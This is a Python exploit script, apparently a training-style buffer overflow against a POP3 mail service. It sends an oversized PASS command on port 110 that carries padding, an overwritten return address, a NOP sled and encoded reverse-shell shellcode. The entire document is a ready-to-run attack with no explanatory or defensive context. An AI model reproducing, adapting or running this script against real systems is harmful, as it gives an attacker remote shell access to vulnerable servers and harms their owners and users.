#!/usr/bin/python3
# coding: utf-8

import sys, socket


if len(sys.argv) != 2:
  print("\nUsage: python {} <host-ip>\n".format(sys.argv[0]))
  sys.exit(1)

reverse_shell = ("\xbe\xd3\xc7\xdc\xd2\xd9\xc5\xd9\x74\x24\xf4\x5f\x33\xc9\xb1"
"\x52\x31\x77\x12\x83\xc7\x04\x03\xa4\xc9\x3e\x27\xb6\x3e\x3c"
"\xc8\x46\xbf\x21\x40\xa3\x8e\x61\x36\xa0\xa1\x51\x3c\xe4\x4d"
"\x19\x10\x1c\xc5\x6f\xbd\x13\x6e\xc5\x9b\x1a\x6f\x76\xdf\x3d"
"\xf3\x85\x0c\x9d\xca\x45\x41\xdc\x0b\xbb\xa8\x8c\xc4\xb7\x1f"
"\x20\x60\x8d\xa3\xcb\x3a\x03\xa4\x28\x8a\x22\x85\xff\x80\x7c"
"\x05\xfe\x45\xf5\x0c\x18\x89\x30\xc6\x93\x79\xce\xd9\x75\xb0"
"\x2f\x75\xb8\x7c\xc2\x87\xfd\xbb\x3d\xf2\xf7\xbf\xc0\x05\xcc"
"\xc2\x1e\x83\xd6\x65\xd4\x33\x32\x97\x39\xa5\xb1\x9b\xf6\xa1"
"\x9d\xbf\x09\x65\x96\xc4\x82\x88\x78\x4d\xd0\xae\x5c\x15\x82"
"\xcf\xc5\xf3\x65\xef\x15\x5c\xd9\x55\x5e\x71\x0e\xe4\x3d\x1e"
"\xe3\xc5\xbd\xde\x6b\x5d\xce\xec\x34\xf5\x58\x5d\xbc\xd3\x9f"
"\xa2\x97\xa4\x0f\x5d\x18\xd5\x06\x9a\x4c\x85\x30\x0b\xed\x4e"
"\xc0\xb4\x38\xc0\x90\x1a\x93\xa1\x40\xdb\x43\x4a\x8a\xd4\xbc"
"\x6a\xb5\x3e\xd5\x01\x4c\xa9\x1a\x7d\x4f\x10\xf3\x7c\x4f\x63"
"\xb8\x08\xa9\x09\xae\x5c\x62\xa6\x57\xc5\xf8\x57\x97\xd3\x85"
"\x58\x13\xd0\x7a\x16\xd4\x9d\x68\xcf\x14\xe8\xd2\x46\x2a\xc6"
"\x7a\x04\xb9\x8d\x7a\x43\xa2\x19\x2d\x04\x14\x50\xbb\xb8\x0f"
"\xca\xd9\x40\xc9\x35\x59\x9f\x2a\xbb\x60\x52\x16\x9f\x72\xaa"
"\x97\x9b\x26\x62\xce\x75\x90\xc4\xb8\x37\x4a\x9f\x17\x9e\x1a"
"\x66\x54\x21\x5c\x67\xb1\xd7\x80\xd6\x6c\xae\xbf\xd7\xf8\x26"
"\xb8\x05\x99\xc9\x13\x8e\xa9\x83\x39\xa7\x21\x4a\xa8\xf5\x2f"
"\x6d\x07\x39\x56\xee\xad\xc2\xad\xee\xc4\xc7\xea\xa8\x35\xba"
"\x63\x5d\x39\x69\x83\x74") 

payload = "A"*2606 + "\x8f\x35\x4a\x5f" + "\x90"*16 + reverse_shell + "B"*100
ipAddress = sys.argv[1]

port = 110

try:
  print("Sending 2700 bytes...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ipAddress, port))
  s.recv(1024)
  s.send("USER test\r\n")
  s.recv(1024)
  s.send("PASS {}\r\n".format(payload))
  s.recv(1024)
  s.close()
except:
  print("\nConnection error...\n")
  sys.exit(0)
